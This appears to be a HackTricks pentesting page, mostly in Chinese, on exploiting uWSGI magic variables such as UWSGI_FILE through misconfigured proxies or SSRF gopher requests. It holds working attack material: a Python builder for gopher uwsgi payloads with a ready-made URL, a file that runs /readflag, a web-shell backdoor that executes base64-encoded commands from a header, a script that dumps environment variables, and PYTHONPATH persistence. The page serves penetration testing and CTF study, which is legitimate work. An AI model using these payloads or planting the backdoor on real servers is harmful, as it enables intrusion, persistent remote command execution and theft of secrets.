# WSGI Post-Exploitation Tricks

{{#include ../../banners/hacktricks-training.md}}

## WSGI Overview

Web Server Gateway Interface (WSGI) 是描述 web 服务器如何与 web 应用通信，以及 web 应用如何串联处理请求的规范。uWSGI 是最流行的 WSGI 服务器之一，常用于提供 Python web 应用。它的原生二进制传输是 uwsgi protocol（小写），用于将一组键/值参数（"uwsgi params"）传递到后端应用服务器。

Related pages you may also want to check:

{{#ref}}
werkzeug.md
{{#endref}}

{{#ref}}
../../pentesting-web/ssrf-server-side-request-forgery/README.md
{{#endref}}

## uWSGI Magic Variables Exploitation

uWSGI 提供了特殊的 "magic variables"，可以改变实例加载和分发应用的方式。这些变量不是普通的 HTTP headers —— 它们是在从反向代理（nginx、Apache mod_proxy_uwsgi 等）到 uWSGI 后端的 uwsgi/SCGI/FastCGI 请求中携带的 uwsgi 参数。如果代理配置将用户可控的数据映射到 uwsgi 参数（例如通过 `$arg_*`、`$http_*`，或不安全地暴露了使用 uwsgi protocol 的端点），攻击者可以设置这些变量并实现 code execution。

### Dangerous mappings in front proxies (nginx example)

Misconfigurations like the following directly expose uWSGI magic variables to user input:
```
location /app/ {
include uwsgi_params;
# DANGEROUS: maps query args into uwsgi params
uwsgi_param UWSGI_FILE $arg_f;                 # /app/?f=/tmp/backdoor.py
uwsgi_param UWSGI_MODULE $http_x_mod;          # header: X-Mod: pkg.mod
uwsgi_param UWSGI_CALLABLE $arg_c;             # /app/?c=application
uwsgi_pass unix:/run/uwsgi/app.sock;
}
```
如果应用或上传功能允许在可预测的路径下写入文件，将其与上述映射相结合通常会在后端加载攻击者控制的文件/模块时导致立即 RCE。

### 关键可利用变量

#### `UWSGI_FILE` - 任意文件加载/执行
```
uwsgi_param UWSGI_FILE /path/to/python/file.py;
```
将任意 Python 文件作为 WSGI 应用加载并执行。如果攻击者能够通过 uwsgi 参数包 控制此参数，则可以实现 Remote Code Execution (RCE)。

#### `UWSGI_SCRIPT` - 脚本加载
```
uwsgi_param UWSGI_SCRIPT module.path:callable;
uwsgi_param SCRIPT_NAME /endpoint;
```
将指定脚本作为新的应用加载。与文件上传或写入能力结合时，这可能导致 RCE。

#### `UWSGI_MODULE` 和 `UWSGI_CALLABLE` - 动态模块加载
```
uwsgi_param UWSGI_MODULE malicious.module;
uwsgi_param UWSGI_CALLABLE evil_function;
uwsgi_param SCRIPT_NAME /backdoor;
```
这些参数允许加载任意 Python 模块并在其中调用特定函数。

#### `UWSGI_SETENV` - 环境变量操作
```
uwsgi_param UWSGI_SETENV DJANGO_SETTINGS_MODULE=malicious.settings;
```
可用于修改环境变量，可能影响应用行为或加载恶意配置。

#### `UWSGI_PYHOME` - Python 环境 操作
```
uwsgi_param UWSGI_PYHOME /path/to/malicious/venv;
```
更改 Python 虚拟环境，可能加载恶意包或不同的 Python 解释器。

#### `UWSGI_CHDIR` - 目录更改
```
uwsgi_param UWSGI_CHDIR /etc/;
```
在处理请求之前更改工作目录，并且可以与其他功能结合使用。

## SSRF + uwsgi 协议 (gopher) pivot

### 威胁模型

如果目标 Web 应用暴露了 SSRF 原语，并且 uWSGI 实例监听在内部 TCP 套接字（例如，`socket = 127.0.0.1:3031`），你可以通过 gopher 发起原始 uwsgi 协议通信并注入 uWSGI 的魔术变量。

之所以可行，是因为许多部署在内部使用非-HTTP 的 uwsgi 套接字；反向代理（nginx/Apache）将客户端 HTTP 翻译为 uwsgi 参数包。借助 SSRF+gopher，你可以直接构造 uwsgi 二进制包并设置诸如 `UWSGI_FILE` 等危险变量。

### uWSGI 协议结构（快速参考）

- Header (4 字节): `modifier1` (1 byte), `datasize` (2 字节，小端序), `modifier2` (1 byte)
- Body: 一系列 `[key_len(2 LE)] [key_bytes] [val_len(2 LE)] [val_bytes]`

对于标准请求，`modifier1` 为 0。主体包含 uwsgi 参数，如 `SERVER_PROTOCOL`、`REQUEST_METHOD`、`PATH_INFO`、`UWSGI_FILE` 等。有关完整细节，请参阅官方协议规范。

### 最小数据包构造器（生成 gopher 有效载荷）
```python
import struct, urllib.parse

def uwsgi_gopher_url(host, port, params):
body = b''.join([struct.pack('<H', len(k))+k.encode()+struct.pack('<H', len(v))+v.encode() for k,v in params.items()])
pkt  = bytes([0]) + struct.pack('<H', len(body)) + bytes([0]) + body
return f"gopher://{host}:{port}/_" + urllib.parse.quote_from_bytes(pkt)

# Example URL:
gopher://127.0.0.1:5000/_%00%D2%00%00%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0E%00REQUEST_METHOD%03%00GET%09%00PATH_INFO%01%00/%0B%00REQUEST_URI%01%00/%0C%00QUERY_STRING%00%00%0B%00SERVER_NAME%00%00%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%0A%00UWSGI_FILE%1D%00/app/profiles/malicious.json%0B%00SCRIPT_NAME%10%00/malicious.json
```
示例用法：强制加载之前写入服务器的文件：
```python
params = {
'SERVER_PROTOCOL':'HTTP/1.1', 'REQUEST_METHOD':'GET', 'PATH_INFO':'/',
'UWSGI_FILE':'/app/profiles/malicious.py', 'SCRIPT_NAME':'/malicious.py'
}
print(uwsgi_gopher_url('127.0.0.1', 3031, params))
```
将生成的 URL 通过 SSRF sink 发送。

### 示例

如果你能在磁盘上写入一个 python 文件（扩展名无关）并包含类似如下的代码：
```python
# /app/profiles/malicious.py
import os
os.system('/readflag > /app/profiles/result.txt')

def application(environ, start_response):
start_response('200 OK', [('Content-Type','text/plain')])
return [b'ok']
```
生成并触发一个 gopher payload，将 `UWSGI_FILE` 设置为此路径。后端将把它作为 WSGI app 导入并执行。

## 后渗透技术

### 1. 持久后门

#### 基于文件的后门
```python
# backdoor.py
import subprocess, base64

def application(environ, start_response):
cmd = environ.get('HTTP_X_CMD', '')
if cmd:
result = subprocess.run(base64.b64decode(cmd), shell=True, capture_output=True, text=True)
response = f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
else:
response = 'Backdoor active'
start_response('200 OK', [('Content-Type', 'text/plain')])
return [response.encode()]
```
使用 `UWSGI_FILE` 加载它，并通过所选的 `SCRIPT_NAME` 访问它。

#### 基于环境的持久化
```
uwsgi_param UWSGI_SETENV PYTHONPATH=/tmp/malicious:/usr/lib/python3.11/site-packages;
```
### 2. 信息泄露

#### 环境变量转储
```python
# env_dump.py
import os, json

def application(environ, start_response):
env_data = {'os_environ': dict(os.environ), 'wsgi_environ': dict(environ)}
start_response('200 OK', [('Content-Type', 'application/json')])
return [json.dumps(env_data, indent=2).encode()]
```
#### File System Access
将 `UWSGI_CHDIR` 与文件服务辅助程序结合使用，以浏览敏感目录。

### 3. Privilege Escalation ideas

- 如果 uWSGI 以提升的权限运行并写入由 root 拥有的 sockets/pids，滥用 env 和目录更改可能帮助你放置具有特权所有者的文件或操纵运行时状态。
- 通过在通过 `UWSGI_FILE` 加载的文件中使用环境变量覆写配置（`UWSGI_*`），可以影响进程模型和 worker，从而使持久化更难被发现。
```python
# malicious_config.py
import os

# Override uWSGI configuration
os.environ['UWSGI_MASTER'] = '1'
os.environ['UWSGI_PROCESSES'] = '1'
os.environ['UWSGI_CHEAPER'] = '1'
```
## 与 uWSGI 链相关的反向代理不同步问题（近期）

使用 Apache httpd 与 `mod_proxy_uwsgi` 的部署最近遇到响应分割/不同步的漏洞，这些漏洞可能影响前端↔后端 的转换层：

- CVE-2023-27522 (Apache httpd 2.4.30–2.4.55; also relevant to uWSGI integration prior to 2.0.22/2.0.26 fixes): 精心构造的源响应头在使用 `mod_proxy_uwsgi` 时可能导致 HTTP response smuggling。将 Apache 升级到 ≥2.4.56 可缓解该问题。
- CVE-2024-24795 (fixed in Apache httpd 2.4.59; uWSGI 2.0.26 adjusted its Apache integration): 多个 httpd 模块中的 HTTP response splitting 在后端注入头时可能导致 desync。在 uWSGI 的 2.0.26 changelog 中，这以 “let httpd handle CL/TE for non-http handlers.” 的形式出现。

这些并不会直接导致 uWSGI 的 RCE，但在边缘情况下可以与 header injection 或 SSRF 链接，进而转向 uWSGI 后端。测试时，对代理和版本进行指纹识别，并考虑将 desync/smuggling primitives 作为进入仅后端路由和 sockets 的入口。

## References

- [uWSGI Magic Variables Documentation](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)
- [IOI SaveData CTF Writeup](https://bugculture.io/writeups/web/ioi-savedata)
- [uWSGI Security Best Practices](https://uwsgi-docs.readthedocs.io/en/latest/Security.html)
- [The uwsgi Protocol (spec)](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)
- [uWSGI 2.0.26 changelog mentioning CVE-2024-24795 adjustments](https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.26.html)

{{#include ../../banners/hacktricks-training.md}}
